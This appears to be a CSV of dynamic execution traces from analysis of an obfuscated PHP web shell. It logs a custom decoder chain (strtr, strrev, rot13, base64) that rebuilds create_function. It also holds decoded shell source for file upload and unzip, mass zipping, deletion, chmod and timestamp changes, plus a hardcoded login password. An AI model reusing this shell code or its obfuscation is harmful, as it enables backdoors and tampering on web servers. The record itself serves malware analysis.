uuid,file_md5,index,source,target,argc,argv,return,dynamic
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,973,create_function,zend_compile_string,2,"{""value"": [[0, ""source_string"", ""function __lambda_func(){function start_unzip($tt,$tmp_name,$new_name,$todir='zipfile'){\r\nif($tt=='1'){\r\n        $z = new Zip;\r\n\t\t$have_zip_file=0;\r\n\t\t$upfile = array(\""tmp_name\""=>$tmp_name,\""name\""=>$new_name);\r\n\t\tif(is_file($upfile[tmp_name])){\r\n\t\t\t$have_zip_file = 1;\r\n\t\t\techo JmCode(\""=NvB5Tg49dA19KgClWTC\"").$upfile[name].JmCode(\""=4wpvkwClWTC\"");\r\n\t\t\tif(preg_match('/\\.zip$/mis',$upfile[name])){\r\n\t\t\t\t$result=$z->Extract($upfile[tmp_name],$todir);\r\n\t\t\t\tif($result==-1){\r\n\t\t\t\t\techo JmCode(t4CiR7fClWTC).$upfile[name].JmCode(\""==tClWTChZimgGYV\"");\r\n\t\t\t\t}\r\n\t\t\t\techo JmCode(\""==NVvTZd9Xohfx8fd3fClWTC\"").$z->total_folders.JmCode(\""=jPiP/Yk2wYV\"").$z->total_files.JmCode(\""=4wpvkwClWTC+VaL84v/8Ffm2wYV\"");\r\n\t\t\t}else{\r\n\t\t\t\techo JmCode(\""==tClWTC\"").$upfile[name].JmCode(\""=4wpvkwClWTCh4CiR7ZVjyzrtpfl7XYV\"");\t\t\t\r\n\t\t\t}\r\n\t\t\tif(realpath($upfile[name])!=realpath($upfile[tmp_name])){\r\n\t\t\t\t@unlink($upfile[name]);\r\n\t\t\t\trename($upfile[tmp_name],$upfile[name]);\r\n\t\t\t}\r\n\t\t}\r\n}elseif($tt=='2'){\r\n$zip = new ZipArchive() ;\r\nif ($zip->open($tmp_name) !== TRUE) {\r\necho JmCode(\""=H7hjif87d6ilGYd36gm8Qo9Yao0uBXhUsnf\"");\r\n}\r\n$zip->extractTo($todir);\r\n$zip->close();\r\n}elseif($tt=='3'){\r\n$phar = new PharData($tmp_name);\r\n$phar->extractTo($todir, null, true);\r\n}\r\necho JmCode(\""==DCbEKLjMvocSJo9VKM25JLy9wV9LJMluTVukmBjAaLhMlBjAaLhMlBjAaLhMFbw+pfd3phEYri\"").urlencode($todir).JmCode(\""+R2Y8t9h1reCvfGXk0PXiqzY5W3o0AKnbcQqjyzpwAKL2Sznv0wMyWUntRTC7N3pv5zW7N3pv5zW7N3pv5zW+R2Y8jej/FphEYriewZ+96wV\"");\r\n}}""]]}",{"value": "003E"},[0]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,974,hiabug,__lambda_func,0,{"value": []},{"value": "void"},[]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,975,eval,hiabug,2,"{""value"": [[0, ""QtrIng"", ""9cDQ7xvVgWUMe1zn90wVbHTMiAHoX5lMm1TWhxvVf9FLSWTp3VInQEGCvtFMx92DgcRVhWKq0IzpWbDQ9ytPAfmXexTWWxtPA0KPWbDQ7fJLyWaLtfwpyMaocEvYcVPZOM""], [1, ""show"", 1]]}",{"value": "void"},"[0, 0]"
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,976,hiabug,strtr,3,"{""value"": [[0, ""str"", ""Strprot1a""], [1, ""from"", ""pa""], [2, ""to"", ""_3""]]}",{"value": "Str_rot13"},"[0, 0, 0]"
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,977,hiabug,strtr,3,"{""value"": [[0, ""str"", ""robprQ_06rfnO""], [1, ""from"", ""o0""], [2, ""to"", ""q4""]]}",{"value": "rqbprQ_46rfnO"},"[0, 0, 0]"
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,978,hiabug,strrev,1,"{""value"": [[0, ""str"", ""rqbprQ_46rfnO""]]}",{"value": "Onfr64_Qrpbqr"},[0]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,979,hiabug,str_rot13,1,"{""value"": [[0, ""str"", ""Onfr64_Qrpbqr""]]}",{"value": "Base64_Decode"},[0]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,980,hiabug,base64_decode,1,"{""value"": [[0, ""str"", ""T2kw""]]}",{"value": "Oi0"},[0]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,981,hiabug,base64_decode,1,"{""value"": [[0, ""str"", ""MDl5""]]}",{"value": "09y"},[0]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,982,hiabug,strtr,3,"{""value"": [[0, ""str"", ""hiJnOAzo1MOK0EKL0W3D""], [1, ""from"", ""Oi0""], [2, ""to"", ""09y""]]}",{"value": "h9Jn0Azo1M0KyEKLyW3D"},"[0, 0, 0]"
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,983,hiabug,strrev,1,"{""value"": [[0, ""str"", ""h9Jn0Azo1M0KyEKLyW3D""]]}",{"value": "D3WyLKEyK0M1ozA0nJ9h"},[0]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,984,hiabug,str_rot13,1,"{""value"": [[0, ""str"", ""D3WyLKEyK0M1ozA0nJ9h""]]}",{"value": "Q3JlYXRlX0Z1bmN0aW9u"},[0]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,985,hiabug,base64_decode,1,"{""value"": [[0, ""str"", ""Q3JlYXRlX0Z1bmN0aW9u""]]}",{"value": "Create_Function"},[0]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,986,hiabug,strrev,1,"{""value"": [[0, ""str"", ""9cDQ7xvVgWUMe1zn90wVbHTMiAHoX5lMm1TWhxvVf9FLSWTp3VInQEGCvtFMx92DgcRVhWKq0IzpWbDQ9ytPAfmXexTWWxtPA0KPWbDQ7fJLyWaLtfwpyMaocEvYcVPZOM""]]}",{"value": "MaIhL3Eco24tEzyfMI9OL3DbWTSlpzS5YPEuL3EuoTjfWTyhqzIlXD0Xrj0XPJyzXPtxL291oaDtCFOwo3IhqPtxLKWlLKxcXFN9CFNjXFOlMKE1pz4tFz1Qo2EyXPV9CK"},[0]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,987,hiabug,str_rot13,1,"{""value"": [[0, ""str"", ""MaIhL3Eco24tEzyfMI9OL3DbWTSlpzS5YPEuL3EuoTjfWTyhqzIlXD0Xrj0XPJyzXPtxL291oaDtCFOwo3IhqPtxLKWlLKxcXFN9CFNjXFOlMKE1pz4tFz1Qo2EyXPV9CK""]]}",{"value": "ZnVuY3Rpb24gRmlsZV9BY3QoJGFycmF5LCRhY3RhbGwsJGludmVyKQ0Kew0KCWlmKCgkY291bnQgPSBjb3VudCgkYXJyYXkpKSA9PSAwKSByZXR1cm4gSm1Db2RlKCI9PX"},[0]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,988,hiabug,base64_decode,1,"{""value"": [[0, ""str"", ""ZnVuY3Rpb24gRmlsZV9BY3QoJGFycmF5LCRhY3RhbGwsJGludmVyKQ0Kew0KCWlmKCgkY291bnQgPSBjb3VudCgkYXJyYXkpKSA9PSAwKSByZXR1cm4gSm1Db2RlKCI9PX""]]}","{""value"": ""function File_Act($array,$actall,$inver)\r\n{\r\n\tif(($count = count($array)) == 0) return JmCode(\""==t/8FfmkGqbEi+k\"");\r\n\tif($actall ==""}",[0]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,989,hiabug,create_function,2,"{""value"": [[0, ""args"", """"], [1, ""code"", ""function File_Act($array,$actall,$inver)\r\n{\r\n\tif(($count = count($array)) == 0) return JmCode(\""==t/8FfmkGqbEi+k\"");\r\n\tif($actall ==""]]}",{"value": "\\x00lambda_46"},"[0, 0]"
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,990,create_function,zend_compile_string,2,"{""value"": [[0, ""source_string"", ""function __lambda_func(){function File_Act($array,$actall,$inver)\r\n{\r\n\tif(($count = count($array)) == 0) return JmCode(\""==t/8FfmkGqbEi+k\"");\r\n\tif($actall == 'e')\r\n\t{\r\n     if(($count = count($array)) == 0) return JmCode(\""==t/8FfmkGqbEi+k\"");\r\n\r\n     function listfiles($dir=\"".\"",$faisunZIP,$mydir){\r\n\t\t$sub_file_num = 0;\r\n\t\tif(is_file($mydir.\""$dir\"")){\r\n\t\t  if(realpath($faisunZIP ->gzfilename)!=realpath($mydir.\""$dir\"")){\r\n\t\t\t$faisunZIP -> addfile(file_get_contents($mydir.$dir),\""$dir\"");\r\n\t\t\treturn 1;\r\n\t\t  }\r\n\t\t\treturn 0;\r\n\t\t}\r\n\t\t\r\n\t\t$handle=opendir($mydir.\""$dir\"");\r\n\t\twhile ($file = readdir($handle)) {\r\n\t\t   if($file==\"".\""||$file==\""..\"")continue;\r\n\t\t   if(is_dir($mydir.\""$dir/$file\"")){\r\n\t\t\t $sub_file_num += listfiles(\""$dir/$file\"",$faisunZIP,$mydir);\r\n\t\t   }\r\n\t\t   else {\r\n\t\t   \t   if(realpath($faisunZIP ->gzfilename)!=realpath($mydir.\""$dir/$file\"")){\r\n\t\t\t     $faisunZIP -> addfile(file_get_contents($mydir.$dir.\""/\"".$file),\""$dir/$file\"");\r\n\t\t\t\t $sub_file_num ++;\r\n\t\t\t\t}\r\n\t\t   }\r\n\t\t}\r\n\t\tclosedir($handle);\r\n\t\tif(!$sub_file_num) $faisunZIP -> addfile(\""\"",\""$dir/\"");\r\n\t\treturn $sub_file_num;\r\n\t}\r\n\r\n   function num_bitunit($num){\r\n\t  $bitunit=array(' B',' KB',' MB',' GB');\r\n\t  for($key=0;$key<count($bitunit);$key++){\r\n\t\tif($num>=pow(2,10*$key)-1){\r\n\t\t  $num_bitunit_str=(ceil($num/pow(2,10*$key)*100)/100).\"" $bitunit[$key]\"";\r\n\t\t}\r\n\t  }\r\n\t  return $num_bitunit_str;\r\n   }\r\n\r\n\t$mydir=$_GET['path'].'/';\r\n\t$inver=urldecode($inver);\r\n\tif(is_array($array)){\r\n\t\t$faisunZIP = new PHPzip;\r\n\t\tif($faisunZIP -> startfile(\""$inver\"")){\r\n\t\t\t$filenum = 0;\r\n\t\t\tforeach($array as $file){\r\n\t\t\t\t$filenum += listfiles($file,$faisunZIP,$mydir);\r\n\t\t\t}\r\n\t\t\t$faisunZIP -> createfile();\r\n\t\t\treturn JmCode(\""==NVGmo7ZYohfx8fd3p9Yao0\"").$filenum.JmCode(\""a0wMyWUntRTC+VaL84v/8Ffm2wYV\"").$inver.JmCode(\""=NP2HY8m3i7416mW\"").$inver.JmCode(\""=tPV\"").num_bitunit(filesize(\""$inver\"")).JmCode(\""=4GLijGX\"");\r\n\t\t}else{\r\n\t\t\treturn $inver.JmCode(\""+VaL84lgV3s1ks7kX79mbvf87nei3Xp6llBiesZYewZgDmAk7XYV\"");\r\n\t\t}\r\n\t}else{\r\n\t\treturn JmCode(\""==tClWTChjej/Ff876CiR7Zk1TC1uTA0Gi7j\"");\r\n    }\r\n\r\n\t}\r\n\t$i = 0;\r\n\twhile($i < $count)\r\n\t{\r\n\t\t$array[$i] = urldecode($array[$i]);\r\n\t\tswitch($actall)\r\n\t\t{\r\n\t\t\tcase \""a\"" : $inver = urldecode($inver); if(!is_dir($inver)) return JmCode(\""=ZimgGeg+rej\""); $filename = array_pop(explode('/',$array[$i])); @copy($array[$i],File_Str($inver.'/'.$filename)); $msg = JmCode(\""9JekJGYh\"").$inver.JmCode(\""==NiP/Yk\""); break;\r\n\t\t\tcase \""b\"" : if(!@unlink($array[$i])){@chmod($filename,0666);@unlink($array[$i]);} $msg = JmCode(\""==D/m6ol\""); break;\r\n\t\t\tcase \""c\"" : if(!eregi(\""^[0-7]{4}$\"",$inver)) return JmCode(\""==j8B3Bg1nA1DGil\""); $newmode = base_convert($inver,8,10); @chmod($array[$i],$newmode); $msg = JmCode(\""==tdBGZhrQA1DGil\"").$inver; break;\r\n\t\t\tcase \""d\"" : @touch($array[$i],strtotime($inver)); $msg = JmCode(\""==tdBGBikdZk46A0\"").$inver; break;\r\n\t\t}\r\n\t\t$i++;\r\n\t}\r\n\treturn JmCode(\""=4CiR7pbEa/l\"").$msg.JmCode(\""==jmkdrm\"");\r\n}}""]]}",{"value": "003E"},[0]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,991,hiabug,__lambda_func,0,{"value": []},{"value": "void"},[]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,992,eval,hiabug,2,"{""value"": [[0, ""QtrIng"", ""=0aPAfGXcVlDIIHqZc3n5MIIkAJGIIxLQMRpecIHBy3If9xLAcHru5JIRymIguKZMqUp5qSoCM3ompSrAgxI5bSHCqKGXgzMjE1H41RI5uJGgOGLnOSp0kxZWM2oISxnZc""], [1, ""show"", 1]]}",{"value": "void"},"[0, 0]"
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,993,hiabug,strtr,3,"{""value"": [[0, ""str"", ""Strprot1a""], [1, ""from"", ""pa""], [2, ""to"", ""_3""]]}",{"value": "Str_rot13"},"[0, 0, 0]"
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,994,hiabug,strtr,3,"{""value"": [[0, ""str"", ""robprQ_06rfnO""], [1, ""from"", ""o0""], [2, ""to"", ""q4""]]}",{"value": "rqbprQ_46rfnO"},"[0, 0, 0]"
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,995,hiabug,strrev,1,"{""value"": [[0, ""str"", ""rqbprQ_46rfnO""]]}",{"value": "Onfr64_Qrpbqr"},[0]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,996,hiabug,str_rot13,1,"{""value"": [[0, ""str"", ""Onfr64_Qrpbqr""]]}",{"value": "Base64_Decode"},[0]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,997,hiabug,base64_decode,1,"{""value"": [[0, ""str"", ""T2kw""]]}",{"value": "Oi0"},[0]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,998,hiabug,base64_decode,1,"{""value"": [[0, ""str"", ""MDl5""]]}",{"value": "09y"},[0]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,999,hiabug,strtr,3,"{""value"": [[0, ""str"", ""hiJnOAzo1MOK0EKL0W3D""], [1, ""from"", ""Oi0""], [2, ""to"", ""09y""]]}",{"value": "h9Jn0Azo1M0KyEKLyW3D"},"[0, 0, 0]"
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,1000,hiabug,strrev,1,"{""value"": [[0, ""str"", ""h9Jn0Azo1M0KyEKLyW3D""]]}",{"value": "D3WyLKEyK0M1ozA0nJ9h"},[0]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,1001,hiabug,str_rot13,1,"{""value"": [[0, ""str"", ""D3WyLKEyK0M1ozA0nJ9h""]]}",{"value": "Q3JlYXRlX0Z1bmN0aW9u"},[0]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,1002,hiabug,base64_decode,1,"{""value"": [[0, ""str"", ""Q3JlYXRlX0Z1bmN0aW9u""]]}",{"value": "Create_Function"},[0]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,1003,hiabug,strrev,1,"{""value"": [[0, ""str"", ""=0aPAfGXcVlDIIHqZc3n5MIIkAJGIIxLQMRpecIHBy3If9xLAcHru5JIRymIguKZMqUp5qSoCM3ompSrAgxI5bSHCqKGXgzMjE1H41RI5uJGgOGLnOSp0kxZWM2oISxnZc""]]}",{"value": "MaIhL3Eco24tnUEgoS9gLJyhXPEjLKEbYPEmnTIfoT5uoJHcrj0XWUAypaMypzyjCJqyqTuip3EvrJ5uoJHbWS9GEIWJEIWoW1ASHyMSHy9BDH1SW10cBj0XnUEgoS9hXR"},[0]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,1004,hiabug,str_rot13,1,"{""value"": [[0, ""str"", ""MaIhL3Eco24tnUEgoS9gLJyhXPEjLKEbYPEmnTIfoT5uoJHcrj0XWUAypaMypzyjCJqyqTuip3EvrJ5uoJHbWS9GEIWJEIWoW1ASHyMSHy9BDH1SW10cBj0XnUEgoS9hXR""]]}",{"value": "ZnVuY3Rpb24gaHRtbF9tYWluKCRwYXRoLCRzaGVsbG5hbWUpew0KJHNlcnZlcmlwPWdldGhvc3RieW5hbWUoJF9TRVJWRVJbJ1NFUlZFUl9OQU1FJ10pOw0KaHRtbF9uKE"},[0]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,1005,hiabug,base64_decode,1,"{""value"": [[0, ""str"", ""ZnVuY3Rpb24gaHRtbF9tYWluKCRwYXRoLCRzaGVsbG5hbWUpew0KJHNlcnZlcmlwPWdldGhvc3RieW5hbWUoJF9TRVJWRVJbJ1NFUlZFUl9OQU1FJ10pOw0KaHRtbF9uKE""]]}","{""value"": ""function html_main($path,$shellname){\r\n$serverip=gethostbyname($_SERVER['SERVER_NAME']);\r\nhtml_n(JmCode(\""==tCykTqcEUC+jJo0uTC\"").$s""}",[0]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,1006,hiabug,create_function,2,"{""value"": [[0, ""args"", """"], [1, ""code"", ""function html_main($path,$shellname){\r\n$serverip=gethostbyname($_SERVER['SERVER_NAME']);\r\nhtml_n(JmCode(\""==tCykTqcEUC+jJo0uTC\"").$s""]]}",{"value": "\\x00lambda_47"},"[0, 0]"
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,1007,create_function,zend_compile_string,2,"{""value"": [[0, ""source_string"", ""function __lambda_func(){function html_main($path,$shellname){\r\n$serverip=gethostbyname($_SERVER['SERVER_NAME']);\r\nhtml_n(JmCode(\""==tCykTqcEUC+jJo0uTC\"").$shellname.JmCode(\""+pvpyEaoyA2W942MckJLtpPZ1RmW9tTqxy2qtDTq84wp0kwCaHPZjRmW9tTqxy2qtHTovSTq84GMfEKn09PC\"").$serverip.JmCode(\""a0GM1kJL2OlWyNQZkbQn0EJn3qFCykJr0AUVatTquO3W9HJou5TV0IUphyTC+pvocSJoa0GM1kJL2OlWlIzqhSJMa0GMgSzotpvoyETMcu2W9HTp5EUV0IUphyTC+pvocSJoa0QqyqzpuEUVaDIEUqFCx9Tn0IJot0zpiMTC+DTq84QM09PC\"").$path.JmCode(\""=4GMfWJL09PC+0zpiM2Y84wp09PC+DTqijwCaxPXxS2ofIzph42ocEKLw9Toh4Jnu12W9f2Lck2Lh9TVaVZ0vh8W9HJqfSzqtpPqc1zL1A3W9HTp5EUV0IUphyTCt4mW9JY+ZsFCyIUouMUVaDKngWJqmqFCyOKr0OlW0yJovI3Ha0GMgSzotDKqj5Jn84mWlITqhI2La0woayTouOlWjDGZa0Qn0EJn3OPM0kwCxE3Y84mW\""));\r\nhtml_n(JmCode(\""+jJo0u2Y84GMfWJL09PC+VUqijwCxE3Y84GMgSzpzy2Y84mWkpFClITMl9zLy1JLlMTVaHPZjRmW9DUnayJMbOlWyNQZkpFCbEUMcqUVa4Jnu1JClIzqhSJM/pFCwW3ptpvocSJoa0GMgSzotHJouWaMckwCxEUC+DTqijwCy1JLlMJnijwCaNmW9VKMxW3ovIJouWaMtpFWjNGZa0QqbqJnyuTVaHPZjRmW9tTqxy2qtpPqzITo9VKM25JLy9mW9ZzpmOlW0MJMfqFCy1JLhOFMgSzpzyTC+pPZ3RmW9tTqxy2qtDTq84wp0kwCaNmW9pzocAJLjAUofI2LtpPZa0mMhyTMxSTpfkJMwOPZ9VKMxW3ovOlWypwY1xmW9DUnayJMbOlWyNQZkpFCbEUMcqUVykzLuEUC\""));\r\n}}""]]}",{"value": "003E"},[0]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,1008,hiabug,__lambda_func,0,{"value": []},{"value": "void"},[]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,1009,eval,get_magic_quotes_gpc,0,{"value": []},{"value": false},[]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,1010,eval,zend_fetch_r_cookie,1,"{""value"": [[0, ""op1"", ""_COOKIE""]]}",{"value": []},[0]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,1011,eval,md5,1,"{""value"": [[0, ""str"", ""qdyma4321""]]}",{"value": "d73399540b5640f523ef978b13d8c80c"},[0]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,1012,eval,zend_fetch_r_post,1,"{""value"": [[0, ""op1"", ""_POST""]]}",{"value": []},[0]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,1013,eval,zend_fetch_r_post,1,"{""value"": [[0, ""op1"", ""_POST""]]}",{"value": []},[0]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,1014,eval,hiabug,1,"{""value"": [[0, ""QtrIng"", ""==tCFIRIBI0Dijm8B3BgeYZ3QY/hah7jG7wHSEyGSARC""]]}",{"value": "<CENTER>\\xd3\\xc3\\xbb\\xa7\\xbb\\xf2\\xc3\\xdc\\xc2\\xeb\\xb4\\xed\\xce\\xf3</CENTER>"},[0]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,1015,hiabug,strtr,3,"{""value"": [[0, ""str"", ""Strprot1a""], [1, ""from"", ""pa""], [2, ""to"", ""_3""]]}",{"value": "Str_rot13"},"[0, 0, 0]"
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,1016,hiabug,strtr,3,"{""value"": [[0, ""str"", ""robprQ_06rfnO""], [1, ""from"", ""o0""], [2, ""to"", ""q4""]]}",{"value": "rqbprQ_46rfnO"},"[0, 0, 0]"
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,1017,hiabug,strrev,1,"{""value"": [[0, ""str"", ""rqbprQ_46rfnO""]]}",{"value": "Onfr64_Qrpbqr"},[0]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,1018,hiabug,str_rot13,1,"{""value"": [[0, ""str"", ""Onfr64_Qrpbqr""]]}",{"value": "Base64_Decode"},[0]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,1019,hiabug,base64_decode,1,"{""value"": [[0, ""str"", ""T2kw""]]}",{"value": "Oi0"},[0]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,1020,hiabug,base64_decode,1,"{""value"": [[0, ""str"", ""MDl5""]]}",{"value": "09y"},[0]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,1021,hiabug,strtr,3,"{""value"": [[0, ""str"", ""hiJnOAzo1MOK0EKL0W3D""], [1, ""from"", ""Oi0""], [2, ""to"", ""09y""]]}",{"value": "h9Jn0Azo1M0KyEKLyW3D"},"[0, 0, 0]"
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,1022,hiabug,strrev,1,"{""value"": [[0, ""str"", ""h9Jn0Azo1M0KyEKLyW3D""]]}",{"value": "D3WyLKEyK0M1ozA0nJ9h"},[0]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,1023,hiabug,str_rot13,1,"{""value"": [[0, ""str"", ""D3WyLKEyK0M1ozA0nJ9h""]]}",{"value": "Q3JlYXRlX0Z1bmN0aW9u"},[0]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,1024,hiabug,base64_decode,1,"{""value"": [[0, ""str"", ""Q3JlYXRlX0Z1bmN0aW9u""]]}",{"value": "Create_Function"},[0]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,1025,hiabug,strrev,1,"{""value"": [[0, ""str"", ""==tCFIRIBI0Dijm8B3BgeYZ3QY/hah7jG7wHSEyGSARC""]]}",{"value": "CRASGyESHw7Gj7hah/YQ3ZYegB3B8mjiD0IBIRIFCt=="},[0]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,1026,hiabug,str_rot13,1,"{""value"": [[0, ""str"", ""CRASGyESHw7Gj7hah/YQ3ZYegB3B8mjiD0IBIRIFCt==""]]}",{"value": "PENFTlRFUj7Tw7unu/LD3MLrtO3O8zwvQ0VOVEVSPg=="},[0]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,1027,hiabug,base64_decode,1,"{""value"": [[0, ""str"", ""PENFTlRFUj7Tw7unu/LD3MLrtO3O8zwvQ0VOVEVSPg==""]]}",{"value": "<CENTER>\\xd3\\xc3\\xbb\\xa7\\xbb\\xf2\\xc3\\xdc\\xc2\\xeb\\xb4\\xed\\xce\\xf3</CENTER>"},[0]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,1028,eval,islogin,2,"{""value"": [[0, ""shellname"", ""xxxxxxxx""], [1, ""myurl"", ""xxxxxxxx""]]}",{"value": "void"},"[0, 0]"
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,1029,islogin,hiabug,1,"{""value"": [[0, ""QtrIng"", ""==jW9LJMluTVukwClWTC+plB4OUZjRwBhy2MlSJo7tUplVwBa5JnxEJLjgwZlVmVtDJnf92pttUpkbwpyEzpiW2B4OUZjHwBbEUMcq3W9HTo5E3ptLKnxkwClITqhI2L84""]]}","{""value"": ""<style type=\""text/css\"">body,td{font-size: 12px;color:#00ff00;background-color:#000000;}input,select,textarea{font-size: 12px;backg""}",[0]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,1030,hiabug,strtr,3,"{""value"": [[0, ""str"", ""Strprot1a""], [1, ""from"", ""pa""], [2, ""to"", ""_3""]]}",{"value": "Str_rot13"},"[0, 0, 0]"
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,1031,hiabug,strtr,3,"{""value"": [[0, ""str"", ""robprQ_06rfnO""], [1, ""from"", ""o0""], [2, ""to"", ""q4""]]}",{"value": "rqbprQ_46rfnO"},"[0, 0, 0]"
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,1032,hiabug,strrev,1,"{""value"": [[0, ""str"", ""rqbprQ_46rfnO""]]}",{"value": "Onfr64_Qrpbqr"},[0]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,1033,hiabug,str_rot13,1,"{""value"": [[0, ""str"", ""Onfr64_Qrpbqr""]]}",{"value": "Base64_Decode"},[0]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,1034,hiabug,base64_decode,1,"{""value"": [[0, ""str"", ""T2kw""]]}",{"value": "Oi0"},[0]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,1035,hiabug,base64_decode,1,"{""value"": [[0, ""str"", ""MDl5""]]}",{"value": "09y"},[0]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,1036,hiabug,strtr,3,"{""value"": [[0, ""str"", ""hiJnOAzo1MOK0EKL0W3D""], [1, ""from"", ""Oi0""], [2, ""to"", ""09y""]]}",{"value": "h9Jn0Azo1M0KyEKLyW3D"},"[0, 0, 0]"
